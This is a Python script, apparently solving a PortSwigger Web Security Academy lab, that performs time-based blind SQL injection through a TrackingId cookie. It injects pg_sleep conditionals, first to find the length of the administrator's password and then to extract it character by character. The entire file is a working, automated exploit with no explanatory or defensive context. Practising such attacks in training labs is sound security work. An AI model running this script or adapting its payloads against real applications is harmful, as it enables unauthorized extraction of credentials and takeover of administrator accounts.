import requests
import string

url = "https://0a7e008404fbb82183741408003800ae.web-security-academy.net/"
cookie_name = "TrackingId"
cookie_value = "YJqDGY4hYhHnV458"
sleep_time = 5

# Obtain password length
injection = "' AND (SELECT CASE WHEN \
    (LENGTH((SELECT password FROM users WHERE username = 'administrator')) = {password_length}) \
    THEN 'a'||pg_sleep({sleep_time}) ELSE 'a' END) = 'a' --"
password_length = 1
while True:
    # Make request
    cookies = {cookie_name: cookie_value + injection.format(password_length=password_length, sleep_time=sleep_time)}
    print(cookies[cookie_name])
    r = requests.get(url, cookies=cookies)
    if r.elapsed.total_seconds() >= sleep_time:
        break
    else:
        password_length += 1

# Obtain password
injection = "' AND (SELECT CASE WHEN \
    (SUBSTR((SELECT password FROM users WHERE username = 'administrator'), {char_index}, 1) = '{char}') \
    THEN 'a'||pg_sleep({sleep_time}) ELSE 'a' END) = 'a'  --"
password = ""
for char_index in range(1, password_length+1):
    for char in string.ascii_lowercase + string.digits:
        cookies = {cookie_name: cookie_value + injection.format(char_index=char_index, char=char, sleep_time=sleep_time)}
        print(cookies[cookie_name])
        r = requests.get(url, cookies=cookies)
        if r.elapsed.total_seconds() >= sleep_time:
            password += char
            break

print(password)